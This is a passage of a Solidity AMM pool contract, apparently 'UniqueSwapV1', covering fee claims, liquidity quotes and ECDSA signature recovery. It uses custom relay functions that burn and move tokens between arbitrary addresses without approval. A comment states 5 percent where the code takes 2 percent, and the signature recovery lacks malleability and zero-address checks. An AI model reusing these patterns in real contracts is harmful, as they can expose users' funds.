        emit ClaimTax(amount, Treasury, uid);
    }

    function _feeClaim(uint256 myK, string memory lID) internal lock {
        uint balance0 = IERC20(WM).balanceOf(address(this));
        uint balance1 = IERC20(WW).balanceOf(address(this));

        uint256 lpTokens = IERC20(ULPT).balanceOf(msg.sender);
        // console.log("currentK:", currentK);
        // console.log("lpTokens:", lpTokens);

        uint256 totalLpTokens = IERC20(ULPT).totalSupply();
        // console.log("totalLpTokens: ", totalLpTokens);

        uint256 share = (lpTokens * currentK) / totalLpTokens;
        // console.log("share: ", share);
        require(share > myK, "No fees to claim");
        uint256 shareOfFees = share - myK;
        // console.log("shareOfFees: ", shareOfFees);

        // uint256 feeSharePercent = (shareOfFees * 100) / currentK;
        // // console.log("feeSharePercent: ", feeSharePercent);
        uint256 feeInLPToken = (shareOfFees * totalLpTokens) / currentK;
        // console.log("feeInLPToken: ", feeInLPToken);

        // console.log("balance0: ", balance0);
        // console.log("balance1: ", balance1);

        uint256 amount0 = (feeInLPToken * balance0) / totalLpTokens; // using balances ensures pro-rata distribution
        uint256 amount1 = (feeInLPToken * balance1) / totalLpTokens; // using balances ensures pro-rata distribution
        // console.log("amount0: ", amount0);
        // console.log("amount1: ", amount1);

        string memory lID2 = lID;

        uint256 amountOUt = getAmountOut(amount0, reserve0, reserve1);
        // console.log("amountOUt: ", amountOUt);
        // calculate 5 percent of amountOut
        uint256 amountOut5Percent = (amountOUt * 2) / 100;
        // console.log("amountOut5Percent: ", amountOut5Percent);

        uint256 totalWldlp = amount1 + (amountOUt - amountOut5Percent);
        // console.log("totalWldlp: ", totalWldlp);
        IERC20(ULPT).relayBurn(msg.sender, feeInLPToken);

        IERC20(WW).relayTransfer(address(this), WETH, totalWldlp);
        IERC20(WLDLP).relayTransfer(WETH, address(this), totalWldlp);
        IERC20(WLDLP).relayTransfer(address(this), msg.sender, totalWldlp);

        uint balance01 = IERC20(WM).balanceOf(address(this));
        uint balance11 = IERC20(WW).balanceOf(address(this));
        // console.log("updated balance01: ", balance01);
        // console.log("updated balance11: ", balance11);

        _update(balance01, balance11, reserve0, reserve1);
        currentK = uint256(reserve0) * reserve1; // reserve0 and reserve1 are up-to-date

        emit ClaimFee(msg.sender, totalWldlp, feeInLPToken, lID2);
    }

    function lPRemove(
        uint256 lpToken
    ) public view returns (uint amount0, uint amount1) {
        address _token0 = WM; // gas savings
        address _token1 = WW; // gas savings
        uint balance0 = IERC20(_token0).balanceOf(address(this));
        uint balance1 = IERC20(_token1).balanceOf(address(this));
        // uint liquidity = IERC20(ULPT).balanceOf(msg.sender);

        uint _totalSupply = IERC20(ULPT).totalSupply(); // gas savings, must be defined here since totalSupply can update in _mintFee
        amount0 = (lpToken * balance0) / _totalSupply; // using balances ensures pro-rata distribution
        amount1 = (lpToken * balance1) / _totalSupply; // using balances ensures pro-rata distribution

        require(
            amount0 > 0 && amount1 > 0,
            "UniqueSwapV1: INSUFFICIENT_LIQUIDITY_BURNING"
        );
    }

    function rate1() public view returns (uint amount0) {
        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings
        amount0 = getAmountIn(1000000000000000000, _reserve0, _reserve1);
    }

    // signer recovery function
    function prefixed(bytes32 hash) internal pure returns (bytes32) {
        return
            keccak256(
                abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
            );
    }

    function recoverSigner(
        bytes32 message,
        bytes memory sig
    ) internal pure returns (address) {
        uint8 v;
        bytes32 r;
        bytes32 s;

        (v, r, s) = splitSignature(sig);

        return ecrecover(message, v, r, s);
    }

    function splitSignature(
        bytes memory sig
    ) internal pure returns (uint8, bytes32, bytes32) {
        require(sig.length == 65, "invalid signature length");

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            // first 32 bytes, after the length prefix
            r := mload(add(sig, 32))
            // second 32 bytes
            s := mload(add(sig, 64))
            // final byte (first byte of the next 32 bytes)
            v := byte(0, mload(add(sig, 96)))
        }

        return (v, r, s);
    }

    function ethTransfer(address to, uint256 amount) internal {
        payable(to).transfer(amount);
    }
}